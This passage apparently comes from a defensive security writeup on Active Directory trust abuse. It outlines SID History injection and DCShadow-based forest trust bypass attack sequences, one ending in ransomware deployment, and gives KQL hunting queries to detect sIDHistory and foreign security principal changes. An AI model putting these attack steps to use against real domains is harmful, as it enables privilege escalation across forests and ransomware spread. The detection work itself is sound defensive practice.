**Attack Sequence:**
1. Compromised source domain Domain Admin
2. Modified external trust to disable SID filtering (or enabled SID History)
3. Injected destination domain Enterprise Admins SID into source user
4. Accessed destination forest with EA privileges
5. Deployed ransomware across destination forest

---

### Example 2: Forest Trust SID History Bypass (CVE-2020-0665 Related)

- **Target:** Multi-forest enterprise environment
- **Timeline:** Early 2024
- **Technique Status:** Forest trust transitive bypass; SID filtering bypass via DCShadow
- **Impact:** Compromised 3 forests; EA privileges in all three
- **Reference:** [Dirkjan's Blog - Forest Trust Transitivity](https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/)

**Attack Sequence:**
1. Compromised one child domain in Forest A
2. Used DCShadow to inject malicious trusted domain object with target Forest C's SID
3. Injected Forest C's Enterprise Admins SID into Forest A user
4. Accessed Forest C as Enterprise Admin (bypassing transitive trust boundaries)

---

## 15. FORENSIC ANALYSIS & ADVANCED HUNTING

### Hunt for SID History Injection (Sentinel KQL)

```kusto
SecurityEvent
| where EventID == 5136
| where AttributeLDAPDisplayName == "sIDHistory"
| where OperationType == "%%14674"  // Value Added
| summarize Count = count() by SubjectUserName, ObjectName, AttributeValue
| where Count > 1 or AttributeValue contains "-512" or AttributeValue contains "-519"
| order by Count desc
```

### Hunt for FSP Membership Changes

```kusto
SecurityEvent
| where EventID == 5136
| where ObjectClass == "foreignSecurityPrincipal"
| where AttributeLDAPDisplayName in ("member", "memberOf")
| project TimeGenerated, Computer, SubjectUserName, ObjectDN, AttributeValue
| order by TimeGenerated desc
```

---